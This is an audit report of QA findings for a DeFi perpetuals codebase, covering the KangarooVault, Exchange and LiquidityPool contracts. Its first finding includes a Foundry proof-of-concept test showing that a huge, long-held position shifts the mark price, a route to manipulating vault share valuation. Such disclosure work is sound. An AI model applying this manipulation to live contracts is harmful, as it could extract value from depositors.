
# Executive Summary

The following report lists a few high impact QA items for the codebase

The following criteria are used for suggested severity

L - Low Severity -> Some risk

R - Refactoring -> Suggested changes for improvements


## TOC

* 1. [L - Exchange Rate can be manipulated if positions are big enough for a long enough time](#L-ExchangeRatecanbemanipulatedifpositionsarebigenoughforalongenoughtime)
	* 1.1. [POC](#POC)
* 2. [L - Maybe best to separate pausing of Trade open and close functionality](#L-MaybebesttoseparatepausingofTradeopenandclosefunctionality)
	* 2.1. [Recommendation](#Recommendation)
* 3. [L - LiquidityPool has no `saveToken` function](#L-LiquidityPoolhasnosaveTokenfunction)
* 4. [L - Min and Max Deposit Amounts can be gamed](#L-MinandMaxDepositAmountscanbegamed)
* 5. [R - maxDepositAmount is not used](#R-maxDepositAmountisnotused)
		* 5.1. [- Lack of Validation on `immutable` values](#LackofValidationonimmutablevalues)
		* 5.2. [- Lack of check](#Lackofcheck)
* 6. [R - Exchange - Unused var `SUSD`](#R-Exchange-UnusedvarSUSD)
* 7. [R - Fuzzing would benefit by using higher runs](#R-Fuzzingwouldbenefitbyusinghigherruns)


##  1. <a name='L-ExchangeRatecanbemanipulatedifpositionsarebigenoughforalongenoughtime'></a>L - Exchange Rate can be manipulated if positions are big enough for a long enough time

If exchangeRate can be maniupulated, then this can be used to extract value or grief withdrawals from the `KangarooVault`

From my experimentation, the values to manipulate the share price are very high, making the attack fairly unlikely.

That said, by manipulating `markPrice` we can get maniupulate `getTokenPrice`, which will cause a leak of value in withdrawals

This requires a fairly laborious setup (enough time has passed, from fairly thorough testing we need at least 1 week)
And also requires a very high amount of capital (1 billion in the example, I think 100MLN works as well)

See POC below:



###  1.1. <a name='POC'></a>POC

Can be run via `forge test --match-test testFundingRateDoesChange -vvvvv`

After creating a new test file `TestExchangeAttack.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {console2} from "forge-std/console2.sol";

import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";

import {TestSystem} from "./utils/TestSystem.sol";
import {Exchange} from "../src/Exchange.sol";
import {LiquidityPool} from "../src/LiquidityPool.sol";
import {PowerPerp} from "../src/PowerPerp.sol";
import {ShortToken} from "../src/ShortToken.sol";
import {ShortCollateral} from "../src/ShortCollateral.sol";
import {MockERC20Fail} from "../src/test-helpers/MockERC20Fail.sol";

contract TestExchangeAttack is TestSystem {
    using FixedPointMathLib for uint256;

    uint256 public constant initialPrice = 1200e18;

    Exchange private exchange;
    PowerPerp private powerPerp;
    ShortToken private shortToken;
    ShortCollateral private shortCollateral;
    MockERC20Fail private susd;

    LiquidityPool private pool;

    function setUp() public {
        deployTestSystem();
        initPool();
        initExchange();
        preparePool();
        setAssetPrice(initialPrice);

        exchange = getExchange();
        powerPerp = getPowerPerp();
        shortToken = getShortToken();
        shortCollateral = getShortCollateral();
        susd = getSUSD();
        pool = getPool();
    }


    function testDeployment() public {
        exchange.refresh();
        _testDeployment();
    }

    event Debug(string name, uint256 value);

    function testFundingRateDoesChange() public {
        (uint256 price,) = exchange.getIndexPrice();
        (uint256 markPrice,) = exchange.getMarkPrice();
        (int256 fundingRate,) = exchange.getFundingRate();

        assertEq(fundingRate, 0);

        deposit(1e40, user_3);
        
        // 10e26 = 1 Billion
        openLong(1e26,  1e34, user_2);
        // openShort(1e20,  user_1);

        vm.warp(block.timestamp + 20 weeks);

        (int256 newFundingRate,) = exchange.getFundingRate();

        emit Debug("fundingRate", uint256(fundingRate));
        emit Debug("newFundingRate", uint256(newFundingRate));
        assertTrue(fundingRate != newFundingRate, "newFundingRate has not changed");

        (uint256 newMarkPrice,) = exchange.getMarkPrice();

        emit Debug("markPrice", markPrice);
        emit Debug("newMarkPrice", newMarkPrice);
        assertTrue(markPrice != newMarkPrice, "price has not changed");
    }

    function deposit(uint256 amount, address user) internal {
        susd.mint(user, amount);

        vm.startPrank(user);
        susd.approve(address(getPool()), amount);
        pool.deposit(amount, user);
        vm.stopPrank();
    }
    function openLong(uint256 amount, uint256 maxCost, address user) internal {
        susd.mint(user, maxCost);

        Exchange.TradeParams memory tradeParams;

        tradeParams.isLong = true;
        tradeParams.amount = amount;
        tradeParams.maxCost = maxCost;

        vm.startPrank(user);
        susd.approve(address(getPool()), maxCost);
        exchange.openTrade(tradeParams);
        vm.stopPrank();
    }

    function closeLong(uint256 amount, uint256 minCost, address user) internal {
        require(powerPerp.balanceOf(user) == amount);

        Exchange.TradeParams memory tradeParams;

        tradeParams.isLong = true;
        tradeParams.amount = amount;
        tradeParams.minCost = minCost;

        vm.prank(user);
        exchange.closeTrade(tradeParams);
    }

    function openShort(uint256 amount, address user)
        internal
        returns (uint256 positionId, Exchange.TradeParams memory tradeParams)
    {

        uint256 collateral = shortCollateral.getMinCollateral(amount, address(susd));


        susd.mint(user, collateral);

        tradeParams.amount = amount;
        tradeParams.collateral = address(susd);
        tradeParams.collateralAmount = collateral;
        tradeParams.minCost = 0;


        vm.startPrank(user);
        susd.approve(address(exchange), collateral);
        (positionId,) = exchange.openTrade(tradeParams);
        vm.stopPrank();
    }

    function openShort(uint256 positionId, uint256 amount, uint256 collateral, address user) internal {
        Exchange.TradeParams memory tradeParams;
        susd.mint(user, collateral);

        tradeParams.positionId = positionId;
        tradeParams.amount = amount;
        tradeParams.collateral = address(susd);
        tradeParams.collateralAmount = collateral;
        tradeParams.minCost = 0;

        vm.startPrank(user);
        susd.approve(address(exchange), collateral);
        (positionId,) = exchange.openTrade(tradeParams);
        vm.stopPrank();
    }

    function closeShort(uint256 positionId, uint256 amount, uint256 maxCost, uint256 collAmt, address user)
        internal
        returns (Exchange.TradeParams memory tradeParams)
    {
        require(shortToken.ownerOf(positionId) == user);
        susd.mint(user, maxCost);

        (, uint256 shortAmount, uint256 collateralAmount, address collateral) = shortToken.shortPositions(positionId);

        tradeParams.amount = amount > shortAmount ? shortAmount : amount;
        tradeParams.collateral = collateral;
        tradeParams.collateralAmount = collAmt > collateralAmount ? collateralAmount : collAmt;
        tradeParams.maxCost = maxCost;
        tradeParams.positionId = positionId;

        vm.startPrank(user);
        susd.approve(address(getPool()), maxCost);
        exchange.closeTrade(tradeParams);
        vm.stopPrank();
    }
}
```

As you can see we can move the markPrice, which will impact the valuation of the KangarooShares during withdrawals

```javascript
    │   └─ ← 719999999999999999280, false
    ├─ emit Debug(name: markPrice, value: 720000000000000000000)
    ├─ emit Debug(name: newMarkPrice, value: 719999999999999999280)
    └─ ← ()
```

##  2. <a name='L-MaybebesttoseparatepausingofTradeopenandclosefunctionality'></a>L - Maybe best to separate pausing of Trade open and close functionality

This can help setup a "withdrawal" only mode in which trades that have been created can be closed as intended

###  2.1. <a name='Recommendation'></a>Recommendation

Change

https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L104-L105

```solidity
        whenNotPaused("EXCHANGE_TRADE")

```
To
```solidity
        whenNotPaused("EXCHANGE_TRADE_CLOSE")

```

##  3. <a name='L-LiquidityPoolhasnosaveTokenfunction'></a>L - LiquidityPool has no `saveToken` function

Some protocols will target top TVL contracts and accounts as a way to distribute their tokens initially.

Because the Vault and LiquidityPool don't have a sweep function for random tokens, Aidrops may be lost.

While it's fine not to add the extra complexity, it's important to consider the risk of missing out on airdrops, which could impact end users and their opportunity cost


##  4. <a name='L-MinandMaxDepositAmountscanbegamed'></a>L - Min and Max Deposit Amounts can be gamed

By chunking up a trade into smaller ones, the max deposit amount can be gamed

Consider adding a global total deposits tracker if you wish to have a guarded launch with limited value at risk

##  5. <a name='R-maxDepositAmountisnotused'></a>R - maxDepositAmount is not used

The goal for capping deposit is typically a risk-aware launch-strategy

There's no check using `maxDepositAmount` which means that there's no way to limit deposits

# Usual Suspects

####  5.1. <a name='LackofValidationonimmutablevalues'></a>- Lack of Validation on `immutable` values

https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L165-L171

```solidity
        VAULT_TOKEN = _vaultToken;
        EXCHANGE = _exchange;
        LIQUIDITY_POOL = _pool;
        PERP_MARKET = _perpMarket;
        UNDERLYING_SYNTH_KEY = _underlyingKey;
        name = _name;
        SUSD = _susd;
```

####  5.2. <a name='Lackofcheck'></a>- Lack of check
https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L519-L525

```solidity

    /// @notice Set Price Impact Delta
    /// @param _delta New Price Impact Delta
    function setPriceImpactDelta(uint256 _delta) external requiresAuth {
        emit UpdatePriceImpactDelta(perpPriceImpact, _delta);
        perpPriceImpact = _delta;
    }
```


##  6. <a name='R-Exchange-UnusedvarSUSD'></a>R - Exchange - Unused var `SUSD`

https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L49-L50

```solidity
    /// @notice sUSD / Quote token instance
    ERC20 public SUSD;
```


# Suggestions

##  7. <a name='R-Fuzzingwouldbenefitbyusinghigherruns'></a>R - Fuzzing would benefit by using higher runs

256 is typically good enough to test edge cases, but may not be sufficient to find very specific issues that happen with odd combinations

It may be best to have a separate fuzzing branch with 10s of thousands of runs